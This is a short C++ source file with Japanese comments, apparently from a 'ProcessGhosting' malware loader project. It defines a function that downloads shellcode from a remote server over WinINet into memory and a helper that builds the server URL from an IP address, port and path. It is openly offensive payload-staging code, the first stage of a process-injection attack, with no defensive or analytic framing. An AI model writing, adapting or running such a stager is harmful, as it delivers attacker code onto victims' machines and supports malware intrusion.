#include "ProcessGhosting.h"

// ファイルサーバーからペイロードをステージング
bool StagingPayload(const std::wstring& url, std::vector<BYTE>& shellcode) {

    // URLを開く
    HINTERNET internetHandle = InternetOpen(L"Shellcode Downloader", INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, 0);
    HINTERNET urlHandle = InternetOpenUrl(internetHandle, url.c_str(), nullptr, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_NO_CACHE_WRITE, 0);

    DWORD bytesRead;
    BYTE buffer[1024];

    // ペイロードを読み込むループ
    while (true) {
        if (!InternetReadFile(urlHandle, buffer, sizeof(buffer), &bytesRead) || bytesRead == 0) {
            break;
        }

        // 読み込んだデータをベクターに追加
        shellcode.insert(shellcode.end(), buffer, buffer + bytesRead);
    }

    return !shellcode.empty();
}


// URLを構築する関数
std::wstring makeUrl(const Arg& arg) {
    return std::wstring(arg.protocol) + std::wstring(arg.ipAddress) + L":" + std::wstring(arg.port) + L"/" + std::wstring(arg.filePath);
}